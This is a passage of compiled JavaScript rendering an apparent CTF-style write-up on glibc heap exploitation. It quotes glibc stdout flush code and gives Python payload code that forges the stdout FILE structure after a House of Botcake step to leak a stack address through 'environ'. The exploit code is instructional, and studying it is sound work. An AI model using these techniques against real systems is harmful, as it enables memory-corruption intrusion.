\",(0,n.jsx)(e.code,{children:\"_IO_do_flush\"}),\":\"]}),`\n`,(0,n.jsx)(e.pre,{className:\"language-c\",children:(0,n.jsxs)(e.code,{className:\"language-c code-highlight\",children:[(0,n.jsx)(e.span,{className:\"code-line\",children:(0,n.jsxs)(e.span,{className:\"token macro property\",children:[(0,n.jsx)(e.span,{className:\"token directive-hash\",children:\"#\"}),(0,n.jsx)(e.span,{className:\"token directive keyword\",children:\"define\"}),\" \",(0,n.jsx)(e.span,{className:\"token macro-name function\",children:\"_IO_do_flush\"}),(0,n.jsxs)(e.span,{className:\"token expression\",children:[(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"_f\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \"]}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"\\\\\"}),`\n`]})}),(0,n.jsx)(e.span,{className:\"code-line\",children:(0,n.jsxs)(e.span,{className:\"token macro property\",children:[\"  \",(0,n.jsxs)(e.span,{className:\"token expression\",children:[(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"_f\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\u003e\"}),\"_mode \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"\u003c=\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),\"\t\t\t\t\t\t\t      \"]}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"\\\\\"}),`\n`]})}),(0,n.jsx)(e.span,{className:\"code-line\",children:(0,n.jsxs)(e.span,{className:\"token macro property\",children:[\"   \",(0,n.jsxs)(e.span,{className:\"token expression\",children:[(0,n.jsx)(e.span,{className:\"token operator\",children:\"?\"}),\" \",(0,n.jsx)(e.span,{className:\"token function\",children:\"_IO_do_write\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"_f\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"_f\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\u003e\"}),\"_IO_write_base\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\"\t\t\t\t      \"]}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"\\\\\"}),`\n`]})}),(0,n.jsx)(e.span,{className:\"code-line\",children:(0,n.jsxs)(e.span,{className:\"token macro property\",children:[\"\t\t  \",(0,n.jsxs)(e.span,{className:\"token expression\",children:[(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"_f\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\u003e\"}),\"_IO_write_ptr\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"_f\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\u003e\"}),\"_IO_write_base\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\"\t\t      \"]}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"\\\\\"}),`\n`]})}),(0,n.jsx)(e.span,{className:\"code-line\",children:(0,n.jsxs)(e.span,{className:\"token macro property\",children:[\"   \",(0,n.jsxs)(e.span,{className:\"token expression\",children:[(0,n.jsx)(e.span,{className:\"token operator\",children:\":\"}),\" \",(0,n.jsx)(e.span,{className:\"token function\",children:\"_IO_wdo_write\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"_f\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"_f\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\u003e\"}),\"_wide_data\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\u003e\"}),\"_IO_write_base\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\"\t\t      \"]}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"\\\\\"}),`\n`]})}),(0,n.jsx)(e.span,{className:\"code-line\",children:(0,n.jsxs)(e.span,{className:\"token macro property\",children:[\"\t\t   \",(0,n.jsxs)(e.span,{className:\"token expression\",children:[(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"_f\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\u003e\"}),\"_wide_data\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\u003e\"}),\"_IO_write_ptr\t\t\t      \"]}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"\\\\\"}),`\n`]})}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsxs)(e.span,{className:\"token macro property\",children:[\"\t\t    \",(0,n.jsxs)(e.span,{className:\"token expression\",children:[(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"_f\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\u003e\"}),\"_wide_data\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\u003e\"}),\"_IO_write_base\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"})]})]}),`\n`]})]})}),`\n`,(0,n.jsxs)(e.p,{children:[\"Our mode is negative (you can confirm in gdb via \",(0,n.jsx)(e.code,{children:\"p *stdout\"}),\"), so it\\u2019ll call \",(0,n.jsx)(e.code,{children:\"_IO_do_write\"}),\". This is a macro for \",(0,n.jsx)(e.code,{children:\"new_do_write\"}),\", which is great! The flush macro is all we needed to get to, rather than worrying about newlines. Now, let\\u2019s inspect this write code to see what else we need to set up:\"]}),`\n`,(0,n.jsx)(e.pre,{className:\"language-c\",children:(0,n.jsxs)(e.code,{className:\"language-c code-highlight\",children:[(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"static\"}),\" \",(0,n.jsx)(e.span,{className:\"token class-name\",children:\"size_t\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token function\",children:\"new_do_write\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"FILE \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),\"fp\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"const\"}),\" \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"char\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),\"data\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token class-name\",children:\"size_t\"}),\" to_do\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token class-name\",children:\"size_t\"}),\" count\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"fp\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\u003e\"}),\"_flags \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"\u0026\"}),\" _IO_IS_APPENDING\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token comment\",children:`/* On a system without a proper O_APPEND implementation,\n`})]}),(0,n.jsx)(e.span,{className:\"code-line\",children:(0,n.jsx)(e.span,{className:\"token comment\",children:`       you would need to sys_seek(0, SEEK_END) here, but is\n`})}),(0,n.jsx)(e.span,{className:\"code-line\",children:(0,n.jsx)(e.span,{className:\"token comment\",children:`       not needed nor desirable for Unix- or Posix-like systems.\n`})}),(0,n.jsx)(e.span,{className:\"code-line\",children:(0,n.jsx)(e.span,{className:\"token comment\",children:`       Instead, just indicate that offset (before and after) is\n`})}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"       unpredictable. */\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    fp\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\u003e\"}),\"_offset \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" _IO_pos_BAD\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"else\"}),\" \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"fp\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\u003e\"}),\"_IO_read_end \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"!=\"}),\" fp\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\u003e\"}),\"_IO_write_base\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"      \",(0,n.jsx)(e.span,{className:\"token class-name\",children:\"off64_t\"}),` new_pos\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"\t\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token function\",children:\"_IO_SYSSEEK\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"fp\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" fp\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\u003e\"}),\"_IO_write_base \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\"}),\" fp\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\u003e\"}),\"_IO_read_end\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"      \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"new_pos \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"==\"}),\" _IO_pos_BAD\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"\t\",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"return\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"      fp\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\u003e\"}),\"_offset \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" new_pos\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"}\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  count \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token function\",children:\"_IO_SYSWRITE\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"fp\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" data\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" to_do\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"fp\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\u003e\"}),\"_cur_column \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"\u0026\u0026\"}),\" count\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    fp\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\u003e\"}),\"_cur_column \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token function\",children:\"_IO_adjust_column\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"fp\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\u003e\"}),\"_cur_column \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" data\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" count\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token function\",children:\"_IO_setg\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"fp\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" fp\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\u003e\"}),\"_IO_buf_base\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" fp\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\u003e\"}),\"_IO_buf_base\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" fp\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\u003e\"}),\"_IO_buf_base\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  fp\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\u003e\"}),\"_IO_write_base \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" fp\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\u003e\"}),\"_IO_write_ptr \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" fp\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\u003e\"}),\"_IO_buf_base\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  fp\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\u003e\"}),\"_IO_write_end \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"fp\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\u003e\"}),\"_mode \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"\u003c=\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"\t\t       \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"\u0026\u0026\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"fp\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\u003e\"}),\"_flags \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"\u0026\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"_IO_LINE_BUF \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"|\"}),\" _IO_UNBUFFERED\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"\t\t       \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"?\"}),\" fp\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\u003e\"}),\"_IO_buf_base \",(0,n.jsx)(e.span,{className:\"token operator\",children:\":\"}),\" fp\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\u003e\"}),\"_IO_buf_end\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"return\"}),\" count\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"}\"}),`\n`]})]})}),`\n`,(0,n.jsxs)(e.p,{children:[\"Alright, the call we need to get to is \",(0,n.jsx)(e.code,{children:\"_IO_SYSWRITE\"}),\". This will finally write whatever we set our buffer. \",(0,n.jsx)(e.em,{children:\"But,\"}),\" we should avoid \",(0,n.jsx)(e.code,{children:\"IO_SYSSEEK\"}),\", since seeking on stdout is undefined. The simplest way is just to add \",(0,n.jsx)(e.code,{children:\"_IO_IS_APPENDING\"}),\" to our flags, which bypasses it completely (The other method is to make \",(0,n.jsx)(e.code,{children:\"read_end==write_base\"}),\", which can be easily setup if necessary).\"]}),`\n`,(0,n.jsxs)(e.p,{children:[\"Finally, we need to make sure that we don\\u2019t break \",(0,n.jsx)(e.code,{children:\"stdout\"}),\" in the future, since we plan to move it\\u2019s read and write buffers onto the stack, instead of libc. After it writes, it sets the \",(0,n.jsx)(e.code,{children:\"write_base\"}),\" and \",(0,n.jsx)(e.code,{children:\"write_ptr\"}),\" to \",(0,n.jsx)(e.code,{children:\"_buf_base\"}),\", and it sets \",(0,n.jsx)(e.code,{children:\"write_end\"}),\" to either \",(0,n.jsx)(e.code,{children:\"_buf_base\"}),\" or \",(0,n.jsx)(e.code,{children:\"_buf_end\"}),\", depending on the \",(0,n.jsx)(e.code,{children:\"_IO_LINE_BUF\"}),\" or \",(0,n.jsx)(e.code,{children:\"_IO_UNBUFFERED\"}),\" flag.\"]}),`\n`,(0,n.jsxs)(e.p,{children:[\"So, we\\u2019re ready to write to the \",(0,n.jsx)(e.code,{children:\"stdout\"}),\" file pointer:\"]}),`\n`,(0,n.jsxs)(e.ul,{children:[`\n`,(0,n.jsxs)(e.li,{children:[\"Set \",(0,n.jsx)(e.code,{children:\"stdout-\u003eflags = _IO_MAGIC | (~_IO_NO_WRITES) | IO_IS_CURRENTLY_PUTTING | _IO_IS_APPENDING\"})]}),`\n`,(0,n.jsxs)(e.li,{children:[\"Set \",(0,n.jsx)(e.code,{children:\"stdout-\u003e_IO_write_base\"}),\" to \",(0,n.jsx)(e.code,{children:\"\u0026environ\"}),\", to make that our buffer.\"]}),`\n`,(0,n.jsxs)(e.li,{children:[\"Set \",(0,n.jsx)(e.code,{children:\"stdout-\u003e_IO_write_ptr = stdout-\u003e_IO_write_end = _IO_buf_end\"}),\" to be \",(0,n.jsx)(e.code,{children:\"\u0026environ+8\"}),\", to make our buffer non zero and just print out the stack leak.\"]}),`\n`]}),`\n`,(0,n.jsx)(e.p,{children:\"The full payload is assembled:\"}),`\n`,(0,n.jsx)(e.pre,{className:\"language-py\",children:(0,n.jsxs)(e.code,{className:\"language-py code-highlight\",children:[(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"p64\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0xfbad1800\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"#flags\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"p64\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"environ\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"3\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"#read_ptrs, dont matter\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"p64\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"environ\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\"  \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"#write_base\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"p64\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"environ \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x8\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"2\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"#write_ptr and end\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"p64\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"environ \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"8\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# buf_base\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"p64\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"environ \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"8\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# buf_end\"}),`\n`]})]})}),`\n`,(0,n.jsx)(e.p,{children:\"Again, thanks to ret2school for detailing this. What were we doing? Right, stack leak\"}),`\n`,(0,n.jsx)(e.p,{children:\"Now, we can get the stack:\"}),`\n`,(0,n.jsx)(e.pre,{className:\"language-py\",children:(0,n.jsxs)(e.code,{className:\"language-py code-highlight\",children:[(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"#symbols\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"environ \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" libc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"symbols\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'environ'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"stdout \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" libc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"symbols\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'_IO_2_1_stdout_'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"# prior botcake exploit, we make the next chunk return the location of stdout\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x230\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"b'T'\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0x208\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" p64\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0x211\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" p64\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"stdout \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"^\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"heap \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x3320\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"\u003e\u003e\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"12\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"2\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x200\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'X'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"# We write out stdout payload\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"3\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x200\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" p64\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0xfbad1800\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" p64\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"environ\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"3\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token 